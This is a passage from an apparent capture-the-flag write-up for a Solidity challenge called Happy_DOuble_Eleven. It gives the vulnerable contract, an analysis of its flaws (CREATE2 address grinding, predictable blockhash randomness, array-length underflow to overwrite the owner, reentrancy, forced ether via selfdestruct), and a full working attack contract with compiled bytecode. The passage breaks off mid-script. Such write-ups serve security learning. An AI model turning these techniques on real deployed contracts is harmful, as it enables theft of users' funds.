//5</span><br><span class="line">    mapping (address =&gt; uint) public level; //6</span><br><span class="line">    </span><br><span class="line">    event pikapika_SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) onlyOwner public &#123;</span><br><span class="line">        require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">        require(level[msg.sender] == 3);</span><br><span class="line">        require(mycart[msg.sender] &gt; 10000000000000000000);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        level[msg.sender] = 0;</span><br><span class="line">        have_chopped = false;</span><br><span class="line">        have_money = false;</span><br><span class="line">        codex.length = 0;</span><br><span class="line">        emit pikapika_SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier first() &#123;</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _transfer(address _from, address _to, uint _value) internal &#123;</span><br><span class="line">        require(_to != address(0x0));</span><br><span class="line">        require(_value &gt; 0);</span><br><span class="line">        </span><br><span class="line">        uint256 oldFromBalance = balanceOf[_from]; </span><br><span class="line">        uint256 oldToBalance = balanceOf[_to]; </span><br><span class="line">        </span><br><span class="line">        uint256 newFromBalance =  balanceOf[_from] - _value; </span><br><span class="line">        uint256 newToBalance =  balanceOf[_to] + _value; </span><br><span class="line">        </span><br><span class="line">        require(oldFromBalance &gt;= _value);</span><br><span class="line">        require(newToBalance &gt; oldToBalance);</span><br><span class="line">        </span><br><span class="line">        balanceOf[_from] = newFromBalance;</span><br><span class="line">        balanceOf[_to] = newToBalance;</span><br><span class="line">        </span><br><span class="line">        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool success) &#123;</span><br><span class="line">        _transfer(msg.sender, _to, _value); </span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function Deposit() public payable &#123;</span><br><span class="line">        if(msg.value &gt;= 500 ether)&#123;</span><br><span class="line">            mycart[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function gift() first &#123;</span><br><span class="line">        require(mycart[msg.sender] == 0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">        balanceOf[msg.sender] = 100;</span><br><span class="line">        mycart[msg.sender] += 1;</span><br><span class="line">        level[msg.sender] += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function Chopping(uint _hand) public &#123;</span><br><span class="line">        Tmall tmall = Tmall(msg.sender);</span><br><span class="line">        </span><br><span class="line">        if (!tmall.Chop_hand(_hand)) &#123;</span><br><span class="line">            hand = _hand;</span><br><span class="line">            have_chopped = tmall.Chop_hand(hand);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint num) public &#123;</span><br><span class="line">        uint seed = uint(blockhash(block.number - 1));</span><br><span class="line">        uint rand = seed % 3;</span><br><span class="line">        if (rand == num) &#123;</span><br><span class="line">            have_money = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        require(level[msg.sender] == 1);</span><br><span class="line">        require(mycart[msg.sender] == 1);</span><br><span class="line">        require(have_chopped == true);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        mycart[msg.sender] += 1;</span><br><span class="line">        level[msg.sender] += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function retract() public &#123;</span><br><span class="line">        require(codex.length == 0);</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 2);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        codex.length -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function revise(uint i, bytes32 _person) public &#123;</span><br><span class="line">        require(codex.length &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000);</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 2);</span><br><span class="line">        require(have_money == true);</span><br><span class="line">        codex[i] = _person;</span><br><span class="line">        if (codex.length &lt; 0xffffffffff000000000000000000000000000000000000000000000000000000)&#123;</span><br><span class="line">            codex.length = 0;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            level[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint _amount) onlyOwner public &#123;</span><br><span class="line">        require(mycart[msg.sender] == 2);</span><br><span class="line">        require(level[msg.sender] == 3);</span><br><span class="line">        require(_amount &gt;= 100);</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= _amount);</span><br><span class="line">        require(address(this).balance &gt;= _amount);</span><br><span class="line">        balanceOf[msg.sender] -= _amount;</span><br><span class="line">        msg.sender.call.value(_amount)();</span><br><span class="line">        mycart[msg.sender] -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><ul><li>our goal<ul><li><code>require(uint(msg.sender) &amp; 0xfff == 0x111)</code>: CREATE2</li><li><code>require(level[msg.sender] == 3);</code></li><li><code>require(mycart[msg.sender] &gt; 10000000000000000000);</code></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function payforflag(string b64email) onlyOwner public &#123;</span><br><span class="line">    require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">    require(level[msg.sender] == 3);</span><br><span class="line">    require(mycart[msg.sender] &gt; 10000000000000000000);</span><br><span class="line">    balanceOf[msg.sender] = 0;</span><br><span class="line">    level[msg.sender] = 0;</span><br><span class="line">    have_chopped = false;</span><br><span class="line">    have_money = false;</span><br><span class="line">    codex.length = 0;</span><br><span class="line">    emit pikapika_SendFlag(b64email);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="level-msg-sender"><a href="#level-msg-sender" class="headerlink" title="level[msg.sender]"></a>level[msg.sender]</h3><ul><li>first level<ul><li>CREATE2</li><li>attack in the <code>constructor()</code></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function gift() first &#123;</span><br><span class="line">    require(mycart[msg.sender] == 0);</span><br><span class="line">    require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">    balanceOf[msg.sender] = 100;</span><br><span class="line">    mycart[msg.sender] += 1;</span><br><span class="line">    level[msg.sender] += 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">modifier first() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>second level<ul><li><code>Chopping()</code>: return false firstly and then return true secondly. It is like ethernaut CTF’s Elevator</li><li><code>guess()</code>: we can cal the <code>rand</code> in the attack contract, because it is a pseudo random number.</li><li><code>buy()</code>: After we have call <code>chopping()</code> and <code>guess()</code>, we can call it to get second level</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> function Chopping(uint _hand) public &#123;</span><br><span class="line">     Tmall tmall = Tmall(msg.sender);</span><br><span class="line">     </span><br><span class="line">     if (!tmall.Chop_hand(_hand)) &#123;</span><br><span class="line">         hand = _hand;</span><br><span class="line">         have_chopped = tmall.Chop_hand(hand);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">function guess(uint num) public &#123;</span><br><span class="line">     uint seed = uint(blockhash(block.number - 1));</span><br><span class="line">     uint rand = seed % 3;</span><br><span class="line">     if (rand == num) &#123;</span><br><span class="line">         have_money = true;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function buy() public &#123;</span><br><span class="line">     require(level[msg.sender] == 1);</span><br><span class="line">     require(mycart[msg.sender] == 1);</span><br><span class="line">     require(have_chopped == true);</span><br><span class="line">     require(have_money == true);</span><br><span class="line">     mycart[msg.sender] += 1;</span><br><span class="line">     level[msg.sender] += 1;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li>Third level<ul><li><code>retract()</code>: underflow</li><li><code>revise()</code>: cal the <code>lengthNeed</code> to overlap the owner</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">function retract() public &#123;</span><br><span class="line">       require(codex.length == 0);</span><br><span class="line">       require(mycart[msg.sender] == 2);</span><br><span class="line">       require(level[msg.sender] == 2);</span><br><span class="line">       require(have_money == true);</span><br><span class="line">       codex.length -= 1;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   function revise(uint i, bytes32 _person) public &#123;</span><br><span class="line">       require(codex.length &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000);</span><br><span class="line">       require(mycart[msg.sender] == 2);</span><br><span class="line">       require(level[msg.sender] == 2);</span><br><span class="line">       require(have_money == true);</span><br><span class="line">       codex[i] = _person;</span><br><span class="line">       if (codex.length &lt; 0xffffffffff000000000000000000000000000000000000000000000000000000)&#123;</span><br><span class="line">           codex.length = 0;</span><br><span class="line">           revert();</span><br><span class="line">       &#125;</span><br><span class="line">       else&#123;</span><br><span class="line">           level[msg.sender] += 1;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   function withdraw(uint _amount) onlyOwner public &#123;</span><br><span class="line">       require(mycart[msg.sender] == 2);</span><br><span class="line">       require(level[msg.sender] == 3);</span><br><span class="line">       require(_amount &gt;= 100);</span><br><span class="line">       require(balanceOf[msg.sender] &gt;= _amount);</span><br><span class="line">       require(address(this).balance &gt;= _amount);</span><br><span class="line">       balanceOf[msg.sender] -= _amount;</span><br><span class="line">       msg.sender.call.value(_amount)();</span><br><span class="line">       mycart[msg.sender] -= 1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="mycart-msg-sender"><a href="#mycart-msg-sender" class="headerlink" title="mycart[msg.sender]"></a>mycart[msg.sender]</h3><ul><li>reentrant<ul><li>After we call <code>revise()</code> to get the thrid level, we can make a underflow to get a lot of money by reentrant</li><li>if we make a reentrant, <code>balanceOf[msg.sender] &gt;= _amount</code> would revert. So we need to get more money, we can make it by <code>_transfer</code> since we can get extra money if the <code>_from</code> and <code>_to</code> are both us.</li><li><code>require(address(this).balance &gt;= _amount);</code>: to pass this check, we should use <code>selfDestruct()</code> to send ether(pay attention to send enough money, or it doesn’t have enough money to make a reentrant) forcibly to the Happy_DOuble_Eleven since there is no fallback and receive in it.</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint _amount) onlyOwner public &#123;</span><br><span class="line">       require(mycart[msg.sender] == 2);</span><br><span class="line">       require(level[msg.sender] == 3);</span><br><span class="line">       require(_amount &gt;= 100);</span><br><span class="line">       require(balanceOf[msg.sender] &gt;= _amount);</span><br><span class="line">       require(address(this).balance &gt;= _amount);</span><br><span class="line">       balanceOf[msg.sender] -= _amount;</span><br><span class="line">       msg.sender.call.value(_amount)();</span><br><span class="line">       mycart[msg.sender] -= 1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract sendMoney&#123;</span><br><span class="line">// deploy with 1 ether</span><br><span class="line">    constructor() public payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function forceSendMoney(address payable  _addr) public&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">        // send money to Happy_DOuble_Eleven</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() payable external&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.10;</span><br><span class="line">interface IHappy_DOuble_Eleven&#123;</span><br><span class="line">    function gift()external;</span><br><span class="line">    function transfer(address to,uint256 )external;</span><br><span class="line">    function guess(uint256 )external;</span><br><span class="line">    function withdraw(uint256 )external;</span><br><span class="line">    function payforflag(string calldata)external;</span><br><span class="line">    function Chopping(uint ) external;</span><br><span class="line">    function buy()external;</span><br><span class="line">    function retract() external;</span><br><span class="line">    function revise(uint, bytes32) external; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    IHappy_DOuble_Eleven public instance = IHappy_DOuble_Eleven(0x9d83e140330758a8fFD07F8Bd73e86ebcA8a5692);</span><br><span class="line">    uint public isWithdraw = 0 ;</span><br><span class="line">    bool public hasEntered = false;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        // get the first level</span><br><span class="line">        instance.gift();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // step05: get money for withdraw()</span><br><span class="line">    function step01_getMoneyForWithdraw()public&#123;</span><br><span class="line">        // make sure we have enough to reentrant when we call withdraw()</span><br><span class="line">        for(uint i=0;i&lt;10;i++)&#123;</span><br><span class="line">            instance.transfer(address(this),100);  </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // step06: get second level</span><br><span class="line">    function step02_getSecondLevel()public&#123;</span><br><span class="line">        instance.Chopping(0);</span><br><span class="line">        uint rand = uint(blockhash(block.number - 1)) % 3;</span><br><span class="line">        instance.guess(rand);</span><br><span class="line">        instance.buy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // step07: get third level and reentrant for enough mycart</span><br><span class="line">    function step03_getThirdLevelAndMycart()public&#123;</span><br><span class="line">        instance.retract();</span><br><span class="line">        bytes32 slot = keccak256(abi.encode(1));</span><br><span class="line">        // cal the `lengthNeed` to overlap the owner</span><br><span class="line">        instance.revise(2**256-1 - uint256(slot) + 1,bytes32(uint256(uint160((address(this))))));</span><br><span class="line">        instance.withdraw(100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // step08: successfully!</span><br><span class="line">    function step04_Complete()public&#123;</span><br><span class="line">        instance.payforflag(&quot;successfully&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Chop_hand(uint _x) public returns (bool)&#123;</span><br><span class="line">        if(!hasEntered)&#123;</span><br><span class="line">            hasEntered = true;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        if(isWithdraw &lt; 2)&#123;</span><br><span class="line">            isWithdraw += 1;</span><br><span class="line">            instance.withdraw(100);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract deployer&#123;</span><br><span class="line">    // step04: deploy the attack contract</span><br><span class="line">    bytes attackByteCode = hex&quot;6080604052739d83e140330758a8ffd07f8bd73e86ebca8a56926000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060006001556000600260006101000a81548160ff02191690831515021790555034801561008457600080fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166324b049056040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100ed57600080fd5b505af1158015610101573d6000803e3d6000fd5b50505050610ea7806101146000396000f3fe60806040526004361061007f5760003560e01c8063679309961161004e57806367930996146101f8578063a8286aca1461020f578063c08af0761461024c578063dbae172c1461026357610080565b8063022ec095146101745780630389502b1461019f5780630d4a7f73146101b657806360251ad2146101e157610080565b5b60026001541015610172576100cc6040518060400160405280600b81526020017f697357697468647261773d00000000000000000000000000000000000000000081525060015461028e565b60018060008282546100de9190610916565b9250508190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60646040518263ffffffff1660e01b815260040161013f91906109b1565b600060405180830381600087803b15801561015957600080fd5b505af115801561016d573d6000803e3d6000fd5b505050505b005b34801561018057600080fd5b5061018961032a565b6040516101969190610a41565b60405180910390f35b3480156101ab57600080fd5b506101b461034e565b005b3480156101c257600080fd5b506101cb610569565b6040516101d89190610a77565b60405180910390f35b3480156101ed57600080fd5b506101f661057c565b005b34801561020457600080fd5b5061020d610607565b005b34801561021b57600080fd5b5061023660048036038101906102319190610ac3565b6107c2565b6040516102439190610a77565b60405180910390f35b34801561025857600080fd5b50610261610806565b005b34801561026f57600080fd5b506102786108b6565b6040516102859190610aff565b60405180910390f35b61032682826040516024016102a4929190610bb3565b6040516020818303038152906040527fb60e72cc000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506108bc565b5050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166347f57b326040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103b657600080fd5b505af11580156103ca573d6000803e3d6000fd5b50505050600060016040516020016103e29190610c2b565b60405160208183030381529060405280519060200120905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630339f30060018360001c7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6104679190610c46565b6104719190610916565b3073ffffffffffffffffffffffffffffffffffffffff1660001b6040518363ffffffff1660e01b81526004016104a8929190610c93565b600060405180830381600087803b1580156104c257600080fd5b505af11580156104d6573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d60646040518263ffffffff1660e01b815260040161053491906109b1565b600060405180830381600087803b15801561054e57600080fd5b505af1158015610562573d6000803e3d6000fd5b5050505050565b600260009054906101000a900460ff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff1660e01b81526004016105d390610d08565b600060405180830381600087803b1580156105ed57600080fd5b505af1158015610601573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323de863560006040518263ffffffff1660e01b81526004016106619190610d63565b600060405180830381600087803b15801561067b57600080fd5b505af115801561068f573d6000803e3d6000fd5b50505050600060036001436106a49190610c46565b4060001c6106b29190610dad565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639189fec1826040518263ffffffff1660e01b815260040161070d9190610aff565b600060405180830381600087803b15801561072757600080fd5b505af115801561073b573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156107a757600080fd5b505af11580156107bb573d6000803e3d6000fd5b5050505050565b6000600260009054906101000a900460ff166107fc576001600260006101000a81548160ff02191690831515021790555060009050610801565b600190505b919050565b60005b600a8110156108b35760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb3060646040518363ffffffff1660e01b815260040161086e929190610dff565b600060405180830381600087803b15801561088857600080fd5b505af115801561089c573d6000803e3d6000fd5b5050505080806108ab90610e28565b915050610809565b50565b60015481565b60006a636f6e736f6c652e6c6f679050600080835160208501845afa505050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610921826108dd565b915061092c836108dd565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610961576109606108e7565b5b828201905092915050565b6000819050919050565b6000819050919050565b600061099b6109966109918461096c565b610976565b6108dd565b9050919050565b6109ab81610980565b82525050565b60006020820190506109c660008301846109a2565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610a07610a026109fd846109cc565b610976565b6109cc565b9050919050565b6000610a19826109ec565b9050919050565b6000610a2b82610a0e565b9050919050565b610a3b81610a20565b82525050565b6000602082019050610a566000830184610a32565b92915050565b60008115159050919050565b610a7181610a5c565b82525050565b6000602082019050610a8c6000830184610a68565b92915050565b600080fd5b610aa0816108dd565b8114610aab57600080fd5b50565b600081359050610abd81610a97565b92915050565b600060208284031215610ad957610ad8610a92565b5b6000610ae784828501610aae565b91505092915050565b610af9816108dd565b82525050565b6000602082019050610b146000830184610af0565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610b54578082015181840152602081019050610b39565b83811115610b63576000848401525b50505050565b6000601f19601f8301169050919050565b6000610b8582610b1a565b610b8f8185610b25565b9350610b9f818560208601610b36565b610ba881610b69565b840191505092915050565b60006040820190508181036000830152610bcd8185610b7a565b9050610bdc6020830184610af0565b9392505050565b6000819050919050565b600060ff82169050919050565b6000610c15610c10610c0b84610be3565b610976565b610bed565b9050919050565b610c2581610bfa565b82525050565b6000602082019050610c406000830184610c1c565b92915050565b6000610c51826108dd565b9150610c5c836108dd565b925082821015610c6f57610c6e6108e7565b5b828203905092915050565b6000819050919050565b610c8d81610c7a565b82525050565b6000604082019050610ca86000830185610af0565b610cb56020830184610c84565b9392505050565b7f7375636365737366756c6c790000000000000000000000000000000000000000600082015250565b6000610cf2600c83610b25565b9150610cfd82610cbc565b602082019050919050565b60006020820190508181036000830152610d2181610ce5565b9050919050565b6000819050919050565b6000610d4d610d48610d4384610d28565b610976565b6108dd565b9050919050565b610d5d81610d32565b82525050565b6000602082019050610d786000830184610d54565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000610db8826108dd565b9150610dc3836108dd565b925082610dd357610dd2610d7e565b5b828206905092915050565b6000610de9826109cc565b9050919050565b610df981610dde565b82525050565b6000604082019050610e146000830185610df0565b610e2160208301846109a2565b9392505050565b6000610e33826108dd565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff821415610e6657610e656108e7565b5b60018201905091905056fea264697066735822122062172fee4eafbc222ece45b3466d8e14d5df7b7a1dffed7df431c35b69fb803264736f6c634300080a0033&quot;;</span><br><span class="line">    function deploy(bytes32 _salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = attackByteCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    // step03: cal the hash</span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackByteCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract sendMoney&#123;</span><br><span class="line">    // step01: deploy with 1 ether</span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    // step02: send Happy_DOuble_Eleven 1 ether</span><br><span class="line">    function forceSendMoney(address payable  _addr) public&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() payable external&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CREATE2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 